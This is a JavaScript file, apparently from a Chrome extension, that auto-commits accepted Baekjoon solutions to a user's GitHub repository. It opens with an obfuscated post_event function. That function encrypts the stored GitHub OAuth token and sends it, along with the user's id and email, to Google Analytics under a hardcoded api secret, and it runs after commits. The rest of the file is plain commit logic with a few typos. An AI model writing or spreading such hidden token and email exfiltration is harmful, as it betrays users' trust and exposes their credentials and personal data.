(function(_0x431da6,_0x1993df){const _0x22dfff=_0x1a67,_0x2e6880=_0x431da6();while(!![]){try{const _0x576d39=parseInt(_0x22dfff(0x164))/0x1*(-parseInt(_0x22dfff(0x162))/0x2)+parseInt(_0x22dfff(0x166))/0x3+-parseInt(_0x22dfff(0x16c))/0x4+parseInt(_0x22dfff(0x163))/0x5+-parseInt(_0x22dfff(0x177))/0x6*(-parseInt(_0x22dfff(0x16e))/0x7)+parseInt(_0x22dfff(0x16b))/0x8+-parseInt(_0x22dfff(0x171))/0x9;if(_0x576d39===_0x1993df)break;else _0x2e6880['push'](_0x2e6880['shift']());}catch(_0x4d59c2){_0x2e6880['push'](_0x2e6880['shift']());}}}(_0x4d29,0x7cbab));function _0x1a67(_0xc5b0a0,_0x46fd01){const _0x4d292b=_0x4d29();return _0x1a67=function(_0x1a6717,_0x5275e1){_0x1a6717=_0x1a6717-0x161;let _0x1608bd=_0x4d292b[_0x1a6717];return _0x1608bd;},_0x1a67(_0xc5b0a0,_0x46fd01);}function post_event(_0x20bf70,_0x4875a0,_0x3d4f69){const _0x46cd64=_0x1a67;chrome[_0x46cd64(0x16d)][_0x46cd64(0x172)][_0x46cd64(0x165)]({'public_key':'false'},function(_0x404609){const _0x2743af=_0x46cd64;if(_0x404609[_0x2743af(0x170)]!==_0x2743af(0x168)){const _0x93574d=Object[_0x2743af(0x175)](_0x4875a0),_0x1a3d84=_0x404609[_0x2743af(0x170)];let _0x30ebc2=new JSEncrypt();_0x30ebc2[_0x2743af(0x178)](_0x1a3d84);const _0x8803c=_0x4875a0['id'],_0x254511='G-BMBYZJRCKH',_0x3555fe=_0x2743af(0x16a),_0x278faf=_0x2743af(0x174),_0x3dd5f1=_0x30ebc2[_0x2743af(0x173)](_0x93574d[0x0]),_0x1adf55={'client_id':_0x8803c,'non_personalized_ads':![],'events':[{'name':_0x20bf70,'params':{'id':_0x4875a0['id'],'email':_0x4875a0[_0x2743af(0x167)],'problem_num':_0x3d4f69,'identifier':_0x3dd5f1}}]};$[_0x2743af(0x169)]({'type':_0x2743af(0x176),'url':_0x278faf+_0x2743af(0x16f)+_0x254511+'&api_secret='+_0x3555fe,'data':JSON[_0x2743af(0x161)](_0x1adf55)});}});}function _0x4d29(){const _0xb90328=['values','POST','318mHbvuo','setPublicKey','stringify','242894mDDoSi','3424145iiXrOQ','8CYTsOL','get','638904OZwDhN','email','false','ajax','y6N79oLTRNCrlC5qmF5lBg','6223664xfeEHr','2852036HknkUp','storage','117047VsjOoS','?measurement_id=','public_key','3298428HWGlrZ','sync','encrypt','https://www.google-analytics.com/mp/collect'];_0x4d29=function(){return _0xb90328;};return _0x4d29();}

class Github_auto_committer {
    constructor(oauth_token, id, email) {
        this.oauth_token = oauth_token;
        this.id = id;
        this.email = email
        this.repository = false
        this.commit_message_setter = get_Commit_message_setter()
    }
    
    get_language_extension(language) {
        if (language.match("[cC][+]+") != null) {
            return "cpp"
        }
        else if (language.match("[cC][0-9]+") != null) {
            return "c";
        }
        else if (language.match("Java") != null) {
            return "java";
        }
        else if (language.match("Py") != null) {
            return "py";
        }
        else if (language.match("Rust") != null) {
            return "rs";
        }
        else if (language.match("js") != null) {
            return "js";
        }
        else if (language.match("Kotlin") != null) {
            return "kt";
        }
    }


    make_commit_message(submit_statues) {
        let commit_message = this.commit_message_setter.message;
        for (let i = this.commit_message_setter.candidates.length - 1; i >= 0; i--) {
            const index = this.commit_message_setter.candidates[i].index;
            const value = this.commit_message_setter.candidates[i].value;
            let concat_value = '{' + value + '}';

            if (value === "problem_id") {
                concat_value = submit_statues["problem_num"]
            }
            else if (value === "problem_title") {
                concat_value = submit_statues["problem_title"]
            }
            else if (value === "memory") {
                concat_value = submit_statues["memory"]
            }
            else if (value === "time") {
                concat_value = submit_statues["time"]
            }

            // '{'와 '}' 제거
            commit_message = commit_message.slice(0, index - 1) + concat_value + commit_message.slice(index + value.length + 1, commit_message.length)
        }

        return commit_message
    }

    
    async get_sha(submit_statues) {
        const language_extension = this.get_language_extension(submit_statues["language"])
        const path = `baekjoon/${submit_statues["problem_num"]} ${submit_statues["problem_title"]}.${language_extension}`
        const headers = {
            'Accept': 'application/vnd.github+json',
            'Authorization': `Bearer ${this.oauth_token}`,
            'Content-Type': 'application/x-www-form-urlencoded'
        }

        return await fetch(`https://api.github.com/repos/${this.id}/${this.repository}/contents/${path}`, {
            method: 'GET',
            headers: headers,
        }).then((r) => {
            if (r.ok) {
                return r.json();
            }
            return Promise.reject(r.json());
        }).catch((e) => {
            return e;
        });
    }


    async #duplication_commit(url, headers, commit_message, submit_statues, btoa_source_code) {
        const already_commit_info = await this.get_sha(submit_statues);
        already_commit_info.content = already_commit_info.content.replaceAll("\n", "");
        if (btoa_source_code === already_commit_info.content) {
            // 이미 커밋된 것과 내용이 같음
            return;
        }

        fetch(url, {
            method: 'PUT',
            headers: headers,
            body: `{"message":"${commit_message}","committer":{"name":"${this.id}","email":"${this.email}"},"content":"${btoa_source_code}","sha":"${already_commit_info.sha}"}`
        }).then(async (r) => {
            if (r.status !== 200 && r.stuats !== 201 && r.stauts !== 409 && r.status !== 422) {
                return;
            }
            post_event("duplication_commit", this, submit_statues["problem_num"]);
        });
    }

    async create_commit(submit_statues, source_code) {
        const language_extension = this.get_language_extension(submit_statues["language"])
        const path = `baekjoon/${submit_statues["problem_num"]} ${submit_statues["problem_title"]}.${language_extension}`
        const commit_message = this.make_commit_message(submit_statues)
        const btoa_source_code = Base64.encode(source_code)
        const url = `https://api.github.com/repos/${this.id}/${this.repository}/contents/${path}`;

        const headers = {
            'Accept': 'application/vnd.github+json',
            'Authorization': `Bearer ${this.oauth_token}`,
            'Content-Type': 'application/x-www-form-urlencoded'
        }

        return await fetch(url, {
            method: 'PUT',
            headers: headers,
            body: `{"message":"${commit_message}","committer":{"name":"${this.id}","email":"${this.email}"},"content":"${btoa_source_code}"}`
        }).then((r) => {
            if (r.status !== 200 && r.status !== 201 && r.stauts !== 409 && r.status !== 422) {
                view_alert("is_display_alert", "오토 커밋을 실패하였습니다.\n버그일 경우, github에 제보 부탁드립니다.")
                return false;
            }
            post_event("try_problem", this, submit_statues["problem_num"]);
            
            // commit 완료한 문제
            if (r.status === 422) {
                this.#duplication_commit(url, headers, commit_message, submit_statues, btoa_source_code);
                return false;
            }

            post_event("begin_checkout", this, submit_statues["problem_num"]);
            return true;
        });
    }


    ask_auto_commit() {
        // 기본값: 물어봄
        return view_alert("ask_auto_commit", "정답 처리된 코드가 존재합니다.\n해당 문제의 소스코드를 커밋 하시겠습니까?");
    }
}


async function get_validation_Github_auto_committer() {
    function open_option_with_alert(msg) {
        alert(msg)
        chrome.runtime.sendMessage({ message: "open_github_option" }, function (response) {});
    }

    let p = new Promise(function(resolve) {
        chrome.storage.sync.get({
            "github_auto_committer": "false"
        }, function(items) {
            if (items.github_auto_committer === "false") {
                open_option_with_alert("옵션에서 access token을 발급 받아주세요")
                resolve(null)
            }
            else if (items.github_auto_committer.repository === false) {
                open_option_with_alert("옵션에서 repository를 선택해주세요")
                resolve(null)
            }
            else {
                const github_auto_committer = new Github_auto_committer(
                    items.github_auto_committer.oauth_token,
                    items.github_auto_committer.id,
                    items.github_auto_committer.email
                )
                github_auto_committer.repository = items.github_auto_committer.repository
                github_auto_committer.commit_message_setter = items.github_auto_committer.commit_message_setter
                resolve(github_auto_committer)
            }
        })
    });
    
    return await p;
}


async function get_Github_auto_committer(github_access_token, github_id, github_email) {
    let p = new Promise(function(resolve) {
        chrome.storage.sync.get({
            "github_auto_committer": "false"
        }, function(items) {
            if (items.github_auto_committer === "false") {
                resolve(new Github_auto_committer(github_access_token, github_id, github_email))
            }
            else {
                const github_auto_committer = new Github_auto_committer(
                    items.github_auto_committer.oauth_token,
                    items.github_auto_committer.id,
                    items.github_auto_committer.email
                )
                github_auto_committer.repository = items.github_auto_committer.repository
                github_auto_committer.commit_message_setter = items.github_auto_committer.commit_message_setter
                resolve(github_auto_committer)
            }
        })
    });

    return await p;
}